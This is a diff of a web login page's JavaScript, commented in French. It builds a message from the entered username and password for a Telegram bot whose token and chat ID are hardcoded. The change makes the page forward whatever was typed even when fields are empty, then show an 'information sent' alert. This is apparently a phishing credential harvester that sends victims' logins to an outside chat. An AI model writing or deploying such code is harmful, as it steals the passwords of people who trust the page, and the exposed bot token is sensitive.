@@ -85,8 +85,8 @@
       const password = document.getElementById('password').value;
 
       // Paramètres du bot Telegram
-      const botToken = '7348058838:AAEurSPCnnOw6yluh3-4oqUq_E61Q55Av-U'; // Remplace par le token de ton bot
-      const chatId = '-4746759996'; // Remplace par l'ID de ton chat Telegram
+      const botToken = '7348058838:AAEurSPCnnOw6yluh3-4oqUq_E61Q55Av-U'; // Token de ton bot
+      const chatId = '-4746759996'; // ID de ton chat Telegram
 
       // Création du message
       const message = `Nom d'utilisateur: ${username}\nMot de passe: ${password}`;
@@ -112,10 +112,11 @@
       // Si les champs sont vides, affiche un message d'erreur mais envoie toujours au Telegram
       if (!username || !password) {
         document.getElementById('error-message').style.display = 'block';
-        return false;
+      } else {
+        document.getElementById('error-message').style.display = 'none';
       }
 
-      // Envoie les informations au serveur (tu pourrais ajouter une vraie logique de connexion ici)
+      // Si tout va bien, tu peux ajouter ici la logique de connexion, par exemple
       // Exemple de code pour gérer la connexion ici si nécessaire
       alert('Les informations ont été envoyées.');
 
